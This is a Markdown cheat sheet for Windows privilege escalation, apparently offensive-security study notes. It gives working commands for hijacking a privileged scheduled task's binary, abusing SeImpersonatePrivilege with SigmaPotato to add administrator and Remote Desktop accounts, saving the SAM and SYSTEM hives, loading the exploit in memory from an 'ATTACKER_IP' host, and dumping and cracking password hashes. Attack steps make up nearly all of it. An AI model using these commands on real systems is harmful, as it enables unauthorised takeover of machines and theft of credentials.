# Abusing other components

## Scheduled Tasks

__REQUIRES__

 - scheduled task executed under more privileged account
 - a reasonably timed trigger for said task
 - an exploitable action on said task
 - permissions required to alter the action of said task

List scheduled tasks
```powershell
schtasks /query /fo LIST /v
```

Powershell
```powershell
Get-ScheduledTask | Where-Object { $_.State -ne 'Disabled' }
```
```powershell
Get-ScheduledTask | Where-Object { $_.State -eq 'Ready' }
```

Check ACL for schtask action
```powershell
icacls $path
```

backup previous action, replace with new one (adduser.exe)
```powershell
move $path $path.bak
move adduser.exe $path\$newname
```

Trigger the task, check work
```powershell
net user
net localgroup administrators
```

## Using Exploits

Enumeration version of windows and updates
```powershell
systeminfo
Get-CimInstance -Class win32_quickfixengineering | Where-Object { $_.Description -eq "Security Update" }
```
```text
be careful not to fall down a rabbithole here.
you will need to do a lot of searching using tools like https://msrc.microsoft.com/update-guide/
finding these explopits will not always be easy
```

## Permissions Abuse

__REQUIRES__

 - SeAssignPrimaryToken
 - SeLoadDriver
 - SeDebug
 - SeImpersonatePrivilege

Determine Privileges
```powershell
whoami /priv
```

Use Sigma Potato (with SeImpersonatePrivilege)
```bash
wget https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.2.6/SigmaPotato.exe
```

```powershell
.\SigmaPotato "net user admin2 password123 /add"
```

hash dump bypass
```powershell
.\SigmaPotato.exe "cmd /c reg save HKLM\SAM C:\temp\SAM && reg save HKLM\SYSTEM C:\temp\SYSTEM"
```

system reflection (remote load)
```powershell
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
```

or file load
```powershell
[System.Reflection.Assembly]::LoadFile("$PWD\sigpo.exe")
```

use reflection
```powershell
[SigmaPotato]::Main('cmd /c net localgroup "Remote Desktop Users" jeff /add')
```

Secrets dump for hashes
```bash
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

hashcat for cracking
```bash
hashcat -m 1000 141_hashes.txt /usr/share/wordlists/rockyou.txt
```

Check work
```powershell
net user
net localgroup Administrators
```